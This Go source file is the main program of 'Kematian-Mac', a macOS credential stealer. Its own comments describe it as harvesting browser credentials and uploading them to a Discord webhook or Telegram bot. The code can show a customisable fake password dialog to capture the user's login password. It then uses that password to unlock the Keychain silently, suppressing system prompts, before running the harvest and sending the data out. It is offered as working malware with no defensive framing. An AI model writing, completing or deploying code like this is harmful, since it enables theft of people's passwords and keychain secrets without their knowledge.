// Kematian-Mac: standalone macOS harvest binary (from Kematian-main recovery engine).
// Collects browser credentials and related data, then uploads a zip to a Discord webhook.
package main

import (
	"flag"
	"log"
	"os"
	"runtime"
	"strings"

	"recovery/recovery/crypto"
)

// Set at build time: -ldflags "-X main.defaultWebhook=https://discord.com/api/webhooks/..."
var defaultWebhook string

func main() {
	webhookFlag := flag.String("webhook", "", "Discord webhook URL (or DISCORD_WEBHOOK_URL / KEMATIAN_WEBHOOK_URL)")
	telegramTokenFlag := flag.String("telegram-token", "", "Telegram bot token (or TELEGRAM_BOT_TOKEN)")
	telegramChatFlag := flag.String("telegram-chat", "", "Telegram chat/channel ID (or TELEGRAM_CHAT_ID)")
	macPasswordFlag := flag.String("mac-password", "", "macOS login password — unlocks Keychain silently (or KEMATIAN_MAC_PASSWORD)")
	noPromptFlag := flag.Bool("no-prompt", false, "do not show GUI password prompt; require -mac-password or KEMATIAN_MAC_PASSWORD")
	promptTitleFlag := flag.String("prompt-title", "", "custom GUI password dialog title")
	promptMessageFlag := flag.String("prompt-message", "", "custom GUI password dialog message")
	quiet := flag.Bool("quiet", false, "minimal console output")
	flag.Parse()

	uploadCfg := resolveUploadConfig(*webhookFlag, *telegramTokenFlag, *telegramChatFlag)

	macPassword, err := acquireMacPassword(*macPasswordFlag, *noPromptFlag, *promptTitleFlag, *promptMessageFlag, *quiet)
	if err != nil {
		log.Fatalf("[kematian] password required: %v", err)
	}
	if err := crypto.ValidateMacLoginPassword(macPassword); err != nil {
		log.Fatalf("[kematian] invalid Mac login password: %v", err)
	}
	crypto.SetMacLoginPassword(macPassword)
	if err := crypto.EnsureLoginKeychainUnlocked(); err != nil {
		log.Fatalf("[kematian] keychain unlock failed (wrong Mac login password?): %v", err)
	}
	if !crypto.LoginKeychainUnlocked() {
		log.Fatal("[kematian] keychain not unlocked — cannot run silent harvest")
	}
	if !*quiet {
		log.Printf("[kematian] keychain silent mode active (no Keychain Access dialogs)")
	}

	if runtime.GOOS != "darwin" {
		log.Fatalf("kematian is built for macOS only (GOOS=%s)", runtime.GOOS)
	}

	if !uploadCfg.valid() {
		log.Fatal("upload destination required: configure Discord webhook and/or Telegram bot token + chat id at build time or via flags/env")
	}

	hostname, _ := os.Hostname()
	if hostname == "" {
		hostname = "mac"
	}

	if !*quiet {
		log.Printf("[kematian] starting harvest on %s (%s/%s) — upload via %s", hostname, runtime.GOOS, runtime.GOARCH, uploadDestLabel(uploadCfg))
	}

	payload, err := runHarvest(hostname)
	if err != nil {
		log.Fatalf("[kematian] harvest failed: %v", err)
	}

	if err := uploadAllHarvest(uploadCfg, hostname, payload, *quiet); err != nil {
		log.Fatalf("[kematian] upload failed: %v", err)
	}

	if !*quiet {
		log.Printf("[kematian] upload complete, exiting")
	}
	os.Exit(0)
}

func sanitizeFilename(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-', r == '_':
			b.WriteRune(r)
		default:
			b.WriteRune('_')
		}
	}
	out := b.String()
	if out == "" {
		return "mac"
	}
	return out
}